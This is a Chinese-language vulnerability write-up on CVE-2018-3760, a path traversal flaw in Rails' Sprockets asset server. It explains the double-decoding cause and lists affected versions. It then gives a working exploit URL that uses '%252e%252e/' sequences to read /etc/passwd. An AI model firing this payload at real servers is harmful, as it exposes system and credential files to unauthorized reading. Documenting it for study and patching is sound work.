（CVE-2018-3760）Ruby On Rails 任意文件读取漏洞
===============================================

一、漏洞简介
------------

Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On
Rails是著名的Ruby
Web开发框架，Sprockets是编译及存储静态资源文件的Ruby库。

在3.7.1及之前的版本中，存在一处因为二次解码导致的路径穿越中断，攻击者可以利用`%252e%252e/`来跨越到根目录，读取或执行目标服务器上任意文件。

二、漏洞影响
------------

4.0.0.beta7及更低版本3.7.1及更低版本2.12.4及更低版本

三、复现过程
------------

### 漏洞分析

漏洞原理问题出在`sprockets`，它用来检查 JavaScript
文件的相互依赖关系，用以优化网页中引入的js文件，以避免加载不必要的js文件。当访问如`http://www.0-sec.org:3000/assets/foo.js`时，会进入`server.rb`

### 漏洞浮现

直接访问`http://www.0-sec.org:3000/assets/file:%2f%2f/etc/passwd`，将会报错，因为文件`/etc/passwd`不在允许的目录中：

![1.png](./.resource/(CVE-2018-3760)RubyOnRails任意文件读取漏洞/media/rId26.png)

我们通过报错页面，可获得允许的目录列表。随便选择其中一个目录，如`/usr/src/blog/app/assets/images`，然后使用`%252e%252e/`向上一层替换，最后读取`/etc/passwd`：

    http://www.0-sec.org:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd

![2.png](./.resource/(CVE-2018-3760)RubyOnRails任意文件读取漏洞/media/rId27.png)
